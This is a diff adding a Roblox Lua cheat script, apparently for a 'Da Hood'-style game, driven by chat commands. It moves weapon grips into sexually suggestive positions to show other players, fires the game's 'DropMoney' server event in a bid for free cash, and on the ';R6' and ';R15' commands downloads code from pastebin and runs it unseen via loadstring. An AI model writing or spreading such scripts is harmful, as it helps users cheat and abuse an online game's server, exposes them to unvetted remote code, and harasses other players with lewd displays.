@@ -1,3 +1,91 @@
+-- Function to equip specific tools
+local function EquipTacAndDoubleBarrelDH(character)
+    -- Get the player's backpack
+    local player = game.Players.LocalPlayer
+    local backpack = player:FindFirstChild("Backpack")
+    
+    -- Make sure the character is valid and the backpack exists
+    if backpack and character then
+        -- Equip only the specified tools or their alternatives
+        for _, tool in pairs(backpack:GetChildren()) do
+            -- Check if tool is Double-Barrel SG or its alternative names
+            if tool.Name == "[Double-Barrel SG]" or tool.Name == "db" then
+                -- Equip the Double-Barrel SG tool
+                tool.Parent = character
+                wait(0.2)
+                tool.Parent = game.Workspace
+                wait(0.2)
+                tool.Parent = character
+            -- Check if tool is Tactical Shotgun or its alternative names
+            elseif tool.Name == "[TacticalShotgun]" or tool.Name == "tac" or tool.Name == "tactical sg" then
+                -- Equip the Tactical Shotgun tool
+                tool.Parent = character
+                wait(0.2)
+                tool.Parent = game.Workspace
+                wait(0.2)
+                tool.Parent = character
+            end
+        end
+    end
+end
+
+-- Define the positions for the tools
+local dbOriginalPosition = CFrame.new(0.133945465, -0.213825256, 0.959548354, 0.892001987, 0.449795008, 0.0449092388, -0.449909091, 0.893037558, -0.00810541213, -0.0437514111, -0.0129750315, 0.99895817)
+local tacticalOriginalPosition = CFrame.new(0.0678538233, -0.213825315, 1.24658322, 0.892001987, 0.449795008, 0.0449092388, -0.449909091, 0.893037558, -0.00810541213, -0.0437514111, -0.0129750315, 0.99895817)
+
+local dbPpPosition = CFrame.new(-0.0596132688, 1.43176389, 2.78347898, 0.892001808, 0.449794888, 0.0449092798, -0.449909091, 0.893037558, -0.00810542703, -0.0437513813, -0.0129749989, 0.998957992)
+local tacticalPpPosition = CFrame.new(0.029014945, 1.58306754, 0.261866689, 0.892001987, 0.449795008, 0.0449092388, -0.449909091, 0.893037558, -0.00810541213, -0.0437514111, -0.0129750315, 0.99895817)
+local hotdognsfwPOS = CFrame.new(-0.859824955, 1.47794378, -0.931441963, 0.0288801752, -0.121209711, 0.992206573, -0.0895527005, 0.988314986, 0.123340875, -0.99556303, -0.0924169645, 0.0176880732)
+
+-- Function to update the tool positions
+local function updateToolPositions(command)
+    local player = game.Players.LocalPlayer
+    local backpack = player.Backpack
+    local tacticalShotgun = backpack:FindFirstChild("[TacticalShotgun]")
+    local dbShotgun = backpack:FindFirstChild("[Double-Barrel SG]")
+    local hotDogTool = backpack:FindFirstChild("[HotDog]")
+
+    
+    if command == ";pp" then
+        if tacticalShotgun then
+            tacticalShotgun.Grip = tacticalPpPosition
+        end
+        if dbShotgun then
+            dbShotgun.Grip = dbPpPosition
+            wait(0.17)
+            EquipTacAndDoubleBarrelDH(game.Players.LocalPlayer.Character)
+        end
+    elseif command == ";unpp" then
+        if tacticalShotgun then
+            tacticalShotgun.Grip = tacticalOriginalPosition
+        end
+        if dbShotgun then
+            dbShotgun.Grip = dbOriginalPosition
+        end
+    elseif command == ";hotcawk" then
+            hotDogTool.Grip = hotdognsfwPOS
+    end
+end
+
+-- Listen for chat messages and respond accordingly
+local function onChatMessage(message)
+    if message == ";pp" or message == ";unpp" or message == ";hotcawk" then
+        updateToolPositions(message)
+    elseif message == ";R6" then
+        loadstring(game:HttpGet("https://pastebin.com/raw/47pfYr3a"))()
+    elseif message == ";R15" then
+        loadstring(game:HttpGet("https://pastebin.com/raw/7dSrNgif"))()
+    elseif message == ";generate cash" then
+        local AM2T = 10000
+        game.ReplicatedStorage.MainEvent:FireServer("DropMoney", AM2T)
+    end
+end
+
+-- Set up the chat listener
+game:GetService("Players").LocalPlayer.Chatted:Connect(onChatMessage)
+
+
+print("COMMANDS: ;R6, ;R15, !generate cash, ;pp, ;unpp, ;hotcawk")
 
 
 -- Services
@@ -315,3 +403,4 @@ RunService.Heartbeat:Connect(function()
         end
     end
 end)
+print("godarmor done")
